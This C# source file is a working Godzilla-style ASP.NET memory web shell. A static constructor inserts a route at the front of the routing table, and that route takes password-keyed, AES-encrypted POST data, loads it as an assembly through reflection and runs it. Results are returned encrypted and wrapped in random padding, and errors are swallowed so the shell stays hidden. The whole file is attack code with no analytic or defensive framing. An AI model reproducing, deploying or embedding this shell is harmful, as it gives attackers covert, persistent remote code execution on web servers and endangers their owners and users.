using System;
using System.Reflection;
using System.Text;
using System.Web;
using System.Web.Routing;

namespace GodzillaMemoryShellProject
{
    //Support for .net Framework 3.5 - all connects when connecting to an existing route
    public class HttpWebRouteMemoryShell : RouteBase
    {

        public string password = "pass";
        public string key = "3c6e0b8a9c15224a";
        private Assembly payload;
        private Random rd = new Random();
        public static bool load = false;


        static HttpWebRouteMemoryShell()
        {
            try
            {
                HttpWebRouteMemoryShell route = new HttpWebRouteMemoryShell(); ;
                RouteTable.Routes.Insert(0, route);
                load = true;
            }
            catch (Exception)
            {
            }

        }

        public HttpWebRouteMemoryShell()
        {

        }
        public override RouteData GetRouteData(System.Web.HttpContextBase httpContext)
        {
            try
            {
                HttpContext.Current.Application.Contents.Count.ToString();
                HttpContext Context = HttpContext.Current;
                if (HttpContext.Current.Request.ContentType.Contains("www-form") && Context.Request[password] != null)
                {
                    string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(password + key))).Replace("-", "");
                    byte[] data = System.Convert.FromBase64String(Context.Request[password]);
                    data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length);
                    if (payload == null)
                    {
                        payload = (Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });
                    }
                    else
                    {
                        object o = payload.CreateInstance("LY");
                        System.IO.MemoryStream outStream = new System.IO.MemoryStream();
                        o.Equals(outStream);
                        o.Equals(data);
                        o.ToString();
                        byte[] r = outStream.ToArray();
                        if (r.Length > 0)
                        {
                            outStream.Dispose();

                            Context.Response.Write(GenerateRandomString(rd.Next(5, 50)));
                            Context.Response.Write(md5.Substring(0, 16));
                            Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length)));
                            Context.Response.Write(md5.Substring(16));
                            Context.Response.Write(GenerateRandomString(rd.Next(10, 60)));
                            HttpContext.Current.Response.End();
                            return null;
                        }
                    }
                }
            }
            catch (Exception)
            {
            }
            return null;
        }

        public static string GenerateRandomString(int length)
        {
            char[] constant = "0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm".ToCharArray();
            StringBuilder sb = new StringBuilder();
            byte[] b = new byte[4];
            new System.Security.Cryptography.RNGCryptoServiceProvider().GetBytes(b);
            Random rd = new Random(BitConverter.ToInt32(b, 0));
            for (int i = 0; i < length; i++)
            {
                sb.Append(constant[rd.Next(constant.Length - 1)].ToString());
            }
            return sb.ToString(); ;
        }
        public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values)
        {
            return null;
        }
    }
}
